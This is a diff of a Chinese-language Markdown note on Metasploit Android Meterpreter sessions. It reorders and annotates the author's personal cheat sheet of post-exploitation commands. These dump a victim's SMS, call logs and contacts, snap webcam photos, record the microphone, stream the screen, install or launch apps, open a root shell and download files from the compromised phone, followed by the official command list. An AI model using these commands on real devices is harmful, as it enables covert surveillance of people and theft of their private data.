@@ -310,6 +310,30 @@ exploit -j
 
 ## MSF session 命令列表
 
+我自己常用的命令
+
+```
+app_list	# 列出所有的app，可以配合app_run使用
+app_run <Package>	# 运行一个APP（会在目标设备直接运行，就类似用着用着突然打开了软件）
+webcam_list	# 列出设备拥有的摄像头
+webcam_snap -i <id>	# 通过指定摄像头拍照并保存（需要摄像头权限）
+upload <src1> <src2> ... <dst> 	# 上传本地文件到指定位置
+app_install <path>	# 通过指定路径安装apk
+check_root	# 检查设备是否已经root
+shell		# 返回一个shell会话，如果目标已经root，可以用su提权
+dump_calllog	# 储存设备的通话记录（需要读取通话记录权限）
+dump_sms		# 储存设备的短信（需要读取短信权限）
+dump_contacts	# 储存设备的联系人列表（需要读取通讯录权限）
+screenshare	# 实时观看设备的屏幕
+screenshot	# 屏幕截图（出了寄生的软件后就截不到了）
+record_mic	# 录音
+portfwd		# 开放端口
+download <path>	# 下载目标机器上的文件
+ls		# 经典命令，显示当前目录下的文件（需要存储权限）
+```
+
+官方全命令
+
 ```
 Core Commands
 =============
@@ -465,25 +489,5 @@ Application Controller Commands
     app_run        Start Main Activty for package name
     app_uninstall  Request to uninstall application
 
-```
-
-我自己常用的命令
-
-```
-app_list	# 列出所有的app，可以配合app_run使用
-app_run <Package>	# 运行一个APP（会在目标设备直接运行，就类似用着用着突然打开了软件）
-webcam_list	# 列出设备拥有的摄像头
-webcam_snap -i <id>	# 通过指定摄像头拍照并保存
-upload <src1> <src2> ... <dst> 	# 上传本地文件到指定位置
-app_install <path>	# 通过指定路径安装apk
-check_root	# 检查设备是否已经root
-shell		# 返回一个shell会话，如果目标已经root，可以用su提权
-dump_calllog	# 储存设备的通话记录
-dump_sms		# 储存设备的短信
-dump_contacts	# 储存设备的联系人列表
-screenshare	# 实时观看设备的屏幕
-screenshot	# 屏幕截图（出了寄生的软件后就截不到了）
-record_mic	# 录音
-portfwd		# 开放端口
 ```
 
